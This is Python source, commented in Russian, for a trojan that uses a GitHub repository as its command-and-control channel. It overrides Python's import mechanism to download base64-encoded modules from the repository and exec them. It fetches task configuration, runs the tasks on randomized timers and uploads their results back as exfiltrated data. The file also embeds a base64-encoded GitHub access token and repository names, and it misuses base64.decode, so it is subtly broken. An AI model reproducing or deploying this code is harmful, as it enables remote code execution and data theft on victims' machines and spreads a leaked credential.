import json
import base64
import sys
import time
import types
import random
import threading
import queue
from github3 import login

# Устанавливаются идентификатор трояна trojan_id, путь к конфигурационному файлу trojan_config,
# путь к данным data_path, инициализируется список модулей trojan_modules,
# флаг конфигурации configured и очередь задач task_queue.
trojan_id = "python"
trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}/"
trojan_modules = []
configured = False
task_queue = queue.Queue()


# Этот класс отвечает за динамическое нахождение и загрузку модулей из репозитория GitHub.
# Он используется для перехвата стандартного механизма импорта модулей Python.
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}" )
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

def decode(tr):
    if tr == '1':
        module = base64.decode('Z2l0aHViX3BhdF8xMUJJSUZFSVkwQXZNNjZqUmxBMW5RX0NRUllKVXV6YWlLWHBzSTM2UG1ZM2dJaXQxRDA3SktwZkpHVlNaaE8wOWNPVDRRRlRNRUFzMjF5YXpm')
        return module
    elif tr == '2':
        module = base64.decode('aWRhNjRwcm8=')
        return module
    elif tr == '3':
        module = base64.decode('Um9ibG94aWFu')
        return module

def connect_to_github():
    gh = login(decode('1'))
    repo = gh.repository(decode('2'), decode('3'))
    branch = repo.branch("crackme")
    return gh, repo, branch


def get_file_contents(filepath):
    # Функция использует API GitHub для получения содержимого указанного файла из репозитория.
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file {filepath}" )
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    # Получение конфигурационного файла: Вызов get_file_contents(trojan_config) загружает содержимое конфигурационного файла из GitHub.
    # Декодирование: Содержимое конфигурационного файла декодируется из base64 и преобразуется в JSON.
    # Импорт модулей: Для каждого модуля в конфигурации проверяется, был ли он уже загружен.
    # Если модуль не найден в sys.modules, он импортируется с использованием exec("import %s" % tasks['module']).
    # Возвращение конфигурации: Функция возвращает декодированную конфигурацию.
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks['module'] not in sys.modules:
            exec(f"import {tasks['module']}")

    return configuration


def store_module_result(data):
    # Подключение к GitHub: Вызов функции connect_to_github() для подключения к репозиторию GitHub.
    # Генерация пути для сохранения данных: Создание уникального пути для сохранения данных в формате data/<trojan_id>/<random_number>.data.
    # Создание файла: Создание нового файла в репозитории GitHub и загрузка данных, закодированных в base64.
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
    repo.create_file(remote_path, "Commit message", data.encode())
    return


def module_runner(module):
    # Добавление задачи в очередь: В очередь задач добавляется задача task_queue.put(1).
    # Выполнение модуля: Вызывается метод run загруженного модуля.
    # Предполагается, что каждый модуль имеет функцию run, которая выполняет основную работу модуля.
    # Удаление задачи из очереди: После выполнения модуля задача удаляется из очереди task_queue.get().
    # Сохранение результата: Результат выполнения модуля сохраняется с помощью функции store_module_result(result).
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return


# Добавление GitImporter в список sys.meta_path.
# Это позволяет использовать GitImporter в качестве метакласса для импорта модулей.
sys.meta_path = [GitImporter()]

while True:
    #   Проверяется, пуста ли очередь задач task_queue.
    #   Если очередь пуста, вызывается функция get_trojan_config() для загрузки конфигурационного файла.
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(5, 20))